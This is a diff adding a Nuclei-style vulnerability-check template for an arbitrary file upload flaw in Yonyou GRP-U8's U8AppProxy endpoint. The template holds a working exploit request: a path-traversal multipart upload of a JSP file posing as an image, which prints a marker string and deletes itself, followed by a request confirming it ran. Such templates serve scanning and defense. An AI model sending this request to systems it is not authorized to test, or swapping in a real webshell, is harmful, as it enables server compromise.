@@ -1,0 +1,46 @@
+id: yongyou-grp-u8-file-upload
+
+info:
+  name: Yonyou GRP-U8 U8AppProxy Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou GRP-U8 management software U8AppProxy has an arbitrary file upload vulnerability. An attacker can upload a webshell to obtain server permissions.
+  reference:
+    - https://mp.weixin.qq.com/s/hYPdNN6skbikC3FFYRlbrQ
+  classification:
+    cvss-score: 9.0
+  tags: file-upload
+
+variables:
+  randName: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../{{randName}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+        Content-Type: image/png
+
+        <%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /{{randName}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
